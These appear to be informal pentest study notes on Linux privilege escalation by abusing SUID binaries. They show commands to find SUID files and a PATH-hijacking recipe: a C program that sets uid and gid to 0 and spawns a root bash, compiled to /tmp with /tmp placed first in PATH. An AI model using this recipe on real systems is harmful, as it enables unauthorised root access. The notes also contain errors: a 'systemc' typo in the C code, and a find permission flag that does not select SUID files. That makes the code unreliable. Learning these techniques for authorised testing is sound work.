# Escalation Path - SUID

---
### Overview
> ***SUID - Set user ID***
- Find out files with the ***S*** bit enabled in the permissions.
>***Note :*** Not every file that has SUID set is vulnerable, try to understand the file usage and stuff and u'll figure it out.
- We can search for the files that have SUID bit enabled with the following command - 
  ```bash
find / -perm -0400 -ls -type f 2>/dev/null
or
find / -perm -u=s -type f 2>/dev/null
  ```
> **Note :** Linpeas will catch this don't worry, but we do need to learn the manual method aye ;).

---
## Escalation via Environment Variables -

- Go ahead and find SUID's.
- use strings SUID
> print $PATH
- we will change the path to run the file/service first that way we can get root.
```bash
echo 'int main() { setgid(0); setuid(0); systemc("/bin/bash"); return 0;}' > /tmp/service.c 
```

```bash
#In command prompt type: 
gcc /tmp/service.c -o /tmp/service
```

```bash
export PATH=/tmp:$PATH
```

- call the suid bianry and u should have root hopefully.
